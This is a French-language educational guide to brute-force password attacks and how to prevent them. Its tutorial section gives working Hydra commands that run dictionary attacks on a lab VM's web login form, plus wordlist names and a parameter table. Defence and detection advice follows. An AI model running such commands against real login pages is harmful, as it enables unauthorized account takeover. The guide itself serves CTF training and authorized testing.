# Attaque par force brute — Guide & Prévention

## Table des matières
- [Qu’est-ce qu’une attaque par force brute ?](#quest-ce-quune-attaque-par-force-brute-)
- [Types d’attaques par force brute](#types-dattaques-par-force-brute)
- [Tutoriel pratique d’attaque](#tutoriel-pratique-dattaque)
- [Méthodes de protection](#méthodes-de-protection)
- [Détection & surveillance](#détection--surveillance)

---

## Qu’est-ce qu’une attaque par force brute ?

Une attaque par force brute est une méthode par essais successifs utilisée pour obtenir des informations telles que des mots de passe ou des identifiants de connexion. L’attaquant teste systématiquement différentes combinaisons jusqu’à trouver la bonne.

### Caractéristiques principales :
- **Chronophage** : peut prendre de quelques secondes à plusieurs années selon la complexité du mot de passe
- **Coûteuse en ressources** : nécessite de la puissance de calcul et de la bande passante
- **Concept simple** : aucune technique sophistiquée requise
- **Très efficace** : contre les mots de passe faibles et les systèmes non protégés

---

## Types d’attaques par force brute

### 1. Force brute simple
Teste systématiquement toutes les combinaisons possibles de caractères.

**Exemple** : `a`, `b`, `c`… puis `aa`, `ab`, `ac`…

### 2. Attaque par dictionnaire
Utilise des listes précompilées de mots de passe courants.

**Wordlists populaires** :
- `rockyou.txt` (14+ millions de mots de passe issus d’une fuite réelle)
- `SecLists/Passwords/Common-Credentials/`
- `10-million-password-list-top-1000000.txt`

### 3. Attaque hybride
Combine des mots du dictionnaire avec des chiffres et des symboles.

**Exemple** : `password` → `password123`, `p@ssword`, `Password!`

### 4. Credential stuffing
Réutilisation de couples identifiant/mot de passe issus d’autres fuites de données.

---

## Tutoriel pratique d’attaque

### Outils utilisés

**Hydra** : outil rapide de cassage d’authentification réseau
```bash
# Installation sur Kali Linux
apt-get install hydra

# Ou sur macOS
brew install hydra
```

### Scénario d’attaque : formulaire de connexion web

#### Étape 1 : Identifier la cible

**Exemple de requête POST** :
```
URL : http://VM-IP/admin/
Méthode : POST
Paramètres :
  - username : admin
  - password : [test]
  - Login : Login
```

**Exemple de requête GET** :
```
URL : http://VM-IP/index.php?page=signin&username=admin&password=wd&Login=Login
Méthode : GET
```

#### Étape 2 : Identifier la réponse d’échec

Tester un mot de passe incorrect et rechercher un indicateur d’échec :
```html
<center>
    <h2 style="margin-top:50px;"></h2>
    <br/>
    <img src="../images/WrongAnswer.gif" alt="">
</center>
```

**Indicateur clé** : présence de `WrongAnswer.gif` ou de la chaîne `WrongAnswer`

#### Étape 3 : Préparer une wordlist

```bash
# Utiliser une wordlist existante
ls ~/wordlists/SecLists/Passwords/Common-Credentials/

# Ou créer une wordlist personnalisée
cat > custom_wordlist.txt << EOF
admin
password
123456
letmein
welcome
EOF
```

#### Étape 4 : Lancer l’attaque avec Hydra

**Pour une requête POST** :
```bash
hydra -l admin   -P ~/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt   -t 4 -V -f   VM-IP   http-post-form "/admin/:username=^USER^&password=^PASS^&Login=Login:F=WrongAnswer"
```

**Pour une requête GET** :
```bash
hydra -l admin   -P ~/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt   -t 4 -V -f   VM-IP   http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=WrongAnswer"
```

### Paramètres Hydra expliqués

| Paramètre | Description | Exemple |
|----------|-------------|---------|
| `-l` | Nom d’utilisateur unique | `-l admin` |
| `-L` | Fichier de noms d’utilisateur | `-L users.txt` |
| `-p` | Mot de passe unique | `-p password123` |
| `-P` | Fichier de mots de passe | `-P wordlist.txt` |
| `-t` | Nombre de threads parallèles | `-t 4` |
| `-V` | Verbeux (toutes les tentatives) | `-V` |
| `-v` | Verbeux (succès uniquement) | `-v` |
| `-f` | Arrêt au premier succès | `-f` |
| `-s` | Port personnalisé | `-s 8080` |
| `F=` | Chaîne d’échec | `F=WrongAnswer` |
| `S=` | Chaîne de succès | `S=Welcome` |

---

## Méthodes de protection

### 1. Politique de verrouillage de compte
Bloquer un compte après plusieurs tentatives échouées.

### 2. Limitation de débit (Rate limiting)
Limiter le nombre de requêtes d’authentification par IP.

### 3. Authentification multifacteur (MFA)
Ajouter un facteur supplémentaire (OTP, application, clé matérielle).

### 4. Politique de mots de passe robustes
- 12–16 caractères minimum
- Mélange de lettres, chiffres et symboles
- Pas de mots du dictionnaire

### 5. CAPTCHA
À activer après un comportement suspect.

### 6. Pare-feu applicatif (WAF)
Exemples : Cloudflare, AWS WAF, ModSecurity.

---

## Détection & surveillance

### Signes d’une attaque par force brute
1. Grand nombre d’échecs de connexion
2. Tentatives séquentielles de mots de passe
3. Attaques distribuées sur plusieurs IP
4. Intervalles réguliers entre requêtes

### Fail2ban
Outil efficace pour bloquer automatiquement les IP malveillantes.

---

## Bonnes pratiques

### Testeurs / CTF
- Autorisation écrite obligatoire
- Environnements contrôlés
- Documentation complète

### Défenseurs
- MFA + rate limiting + logs
- Surveillance régulière
- Tests de sécurité autorisés

---

⚠️ **Avertissement légal** : Ce document est destiné uniquement à des fins pédagogiques (CTF, tests d’intrusion autorisés). Toute utilisation non autorisée est illégale.
